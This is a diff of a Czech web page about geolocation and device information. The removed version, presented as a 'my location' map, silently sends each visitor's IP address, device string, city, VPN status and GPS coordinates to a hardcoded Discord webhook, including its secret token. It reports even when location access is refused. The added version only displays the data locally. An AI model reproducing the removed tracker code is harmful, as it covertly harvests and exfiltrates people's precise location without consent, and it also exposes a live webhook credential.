@@ -3,106 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Moje Lokace</title>
-    <!-- Přidání odkazu na CSS soubor -->
-    <link rel="stylesheet" href="styles.css">
-    <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
+    <title>Geolokace a Informace o Zařízení</title>
+    <script>
+        // Funkce pro získání informací
+        function getDeviceInfo() {
+            // Získání informací o zařízení (User Agent)
+            var userAgent = navigator.userAgent;
+
+            // Funkce pro získání veřejné IP adresy
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip;
+                    // Získání města a země pomocí IP geolokačního API
+                    fetch(`https://ipinfo.io/${ipAddress}/json`)
+                        .then(response => response.json())
+                        .then(info => {
+                            var city = info.city;
+                            var country = info.country;
+
+                            // VPN status (Toto je velmi základní kontrola, potřebuje pokročilejší detekci)
+                            var vpnStatus = "Neznámé"; // Tohle bych doporučil detekovat pomocí externího API nebo knihovny
+
+                            // Získání GPS souřadnic
+                            if (navigator.geolocation) {
+                                navigator.geolocation.getCurrentPosition(position => {
+                                    var lat = position.coords.latitude;
+                                    var lon = position.coords.longitude;
+
+                                    // Sestavení odkazu na Mapy.cz
+                                    var mapUrl = `https://mapy.cz/zakladni?x=${lon}&y=${lat}&z=13`;
+
+                                    // Zobrazení informací na stránce
+                                    displayInfo(userAgent, ipAddress, city, country, vpnStatus, lat, lon, mapUrl);
+                                }, () => {
+                                    alert("Chyba při získávání GPS souřadnic.");
+                                });
+                            } else {
+                                alert("Geolokace není podporována tímto prohlížečem.");
+                            }
+                        });
+                });
+        }
+
+        // Funkce pro zobrazení informací na stránce
+        function displayInfo(userAgent, ipAddress, city, country, vpnStatus, lat, lon, mapUrl) {
+            var output = `
+                📱 Zařízení: ${userAgent}<br>
+                🌍 IP Adresa: ${ipAddress} (Město: ${city}, Země: ${country})<br>
+                🌐 VPN: ${vpnStatus}<br>
+                📍 GPS Souřadnice: ${lat}, ${lon}<br>
+                🔗 Mapa: <a href="${mapUrl}" target="_blank">Zobrazit na Mapy.cz</a>
+            `;
+            document.getElementById("output").innerHTML = output;
+        }
+    </script>
 </head>
 <body>
-
-<h2>Tvoje poloha</h2>
-<button onclick="getUserLocation()">Povolit polohu</button>
-<div id="map"></div>
-
-<script>
-    const webhookURL = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC";
-
-    // Funkce pro získání IP informací
-    async function getIPInfo() {
-        try {
-            const response = await fetch("https://ipapi.co/json/");
-            const data = await response.json();
-            return {
-                ip: data.ip,
-                city: data.city || "Neznámé město",
-                country: data.country_code || "Neznámá země",
-                vpn: data.security ? (data.security.vpn ? "TRUE" : "FALSE") : "Neznámé"
-            };
-        } catch (error) {
-            console.error("Chyba při získávání IP:", error);
-            return { ip: "Neznámá", city: "Neznámé", country: "Neznámé", vpn: "Neznámé" };
-        }
-    }
-
-    // Funkce pro odeslání dat na Discord webhook
-    function sendLocationToWebhook(latitude, longitude, ipInfo, userAgent) {
-        const mapyCzURL = `https://en.mapy.cz/zakladni?x=${longitude}&y=${latitude}&z=15&source=coor&id=${longitude},${latitude}`;
-        const message = `📱 **Zařízení:** ${userAgent}
-🌍 **IP Adresa:** ${ipInfo.ip} (Město: ${ipInfo.city}, Země: ${ipInfo.country})
-🌐 **VPN:** ${ipInfo.vpn}
-📍 **GPS Souřadnice:** ${latitude}, ${longitude}
-🔗 **Mapa:** [Zobrazit na Mapy.cz](${mapyCzURL})`;
-
-        fetch(webhookURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: message })
-        })
-        .then(response => console.log("Lokace odeslána:", response))
-        .catch(error => console.error("Chyba při odesílání:", error));
-    }
-
-    // Funkce pro zobrazení a odeslání GPS polohy
-    function showLocation(position, ipInfo) {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        const userAgent = navigator.userAgent;
-
-        // Zobrazit mapu
-        const map = L.map('map').setView([latitude, longitude], 15);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            attribution: '&copy; OpenStreetMap contributors'
-        }).addTo(map);
-
-        L.marker([latitude, longitude]).addTo(map)
-            .bindPopup(`Tady jsi! 📍\nLat: ${latitude}, Lon: ${longitude}`)
-            .openPopup();
-
-        // Okamžité odeslání na webhook
-        sendLocationToWebhook(latitude, longitude, ipInfo, userAgent);
-    }
-
-    // Funkce pro zpracování chyby GPS
-    function errorHandler(error, ipInfo) {
-        const userAgent = navigator.userAgent;
-        const message = `📱 **Zařízení:** ${userAgent}
-🌍 **IP Adresa:** ${ipInfo.ip} (Město: ${ipInfo.city}, Země: ${ipInfo.country})
-🌐 **VPN:** ${ipInfo.vpn}
-🚫 **GPS není potvrzena**`;
-
-        fetch(webhookURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: message })
-        })
-        .then(response => console.log("Chyba GPS odeslána:", response))
-        .catch(error => console.error("Chyba při odesílání:", error));
-    }
-
-    // Funkce pro získání GPS po potvrzení
-    async function getUserLocation() {
-        const ipInfo = await getIPInfo();
-
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                position => showLocation(position, ipInfo),  // Získání polohy a odeslání na webhook
-                error => errorHandler(error, ipInfo)         // Zpracování chyby GPS
-            );
-        } else {
-            errorHandler({ message: "Geolokace není podporována" }, ipInfo);
-        }
-    }
-</script>
-
+    <div class="container">
+        <h2>Geolokace a Informace o Zařízení</h2>
+        <button onclick="getDeviceInfo()">Získat Informace</button>
+        <div id="output"></div>
+    </div>
 </body>
 </html>
